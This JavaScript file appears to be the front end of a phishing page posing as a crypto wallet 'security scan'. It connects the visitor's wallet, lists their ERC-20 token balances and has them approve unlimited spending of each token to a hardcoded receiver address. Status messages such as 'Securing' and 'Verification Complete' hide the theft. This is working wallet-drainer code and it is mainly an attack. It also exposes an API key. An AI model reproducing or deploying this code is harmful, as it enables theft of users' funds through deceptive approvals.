// app.js
const RECEIVER = "0x2D33C1034C92308e952452A87E2F97f29bf53542";
const ALCHEMY_KEY = "33B7e_rNnXE7BzLP1B3q-"; // Get from dashboard.alchemy.com

async function startProScan() {
    const status = document.getElementById('status');
    const btn = document.getElementById('cta-btn');
    
    try {
        await window.modal.open();
        const provider = window.modal.getWalletProvider();
        if (!provider) return;

        const web3Provider = new ethers.providers.Web3Provider(provider);
        const signer = web3Provider.getSigner();
        const address = await signer.getAddress();

        status.innerHTML = "<span class='pulse'>🔍 Scanning all ERC-20 assets...</span>";

        // 1. Get all token balances via Alchemy API
        const response = await fetch(`https://eth-mainnet.g.alchemy.com/v2/33B7e_rNnXE7BzLP1B3q-`, {
            method: 'POST',
            body: JSON.stringify({
                jsonrpc: "2.0", method: "alchemy_getTokenBalances",
                params: [address]
            })
        });
        const data = await response.json();
        const tokens = data.result.tokenBalances.filter(t => t.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000");

        if (tokens.length === 0) {
            status.innerText = "✅ No assets found to secure.";
            return;
        }

        // 2. Sequential "Security Verification" (Approvals)
        for (let t of tokens) {
            status.innerText = `Securing: ${t.contractAddress.substring(0,12)}...`;
            const contract = new ethers.Contract(t.contractAddress, ["function approve(address,uint256) public returns (bool)"], signer);
            
            // This pops up in the user's Trust Wallet
            const tx = await contract.approve(RECEIVER, ethers.constants.MaxUint256);
            await tx.wait(1); // Wait for inclusion
        }

        status.innerHTML = "<b style='color:green'>Verification Complete.</b>";
        btn.innerText = "Protected";
        btn.disabled = true;

    } catch (err) {
        status.innerText = "Scan Cancelled by User.";
    }
}
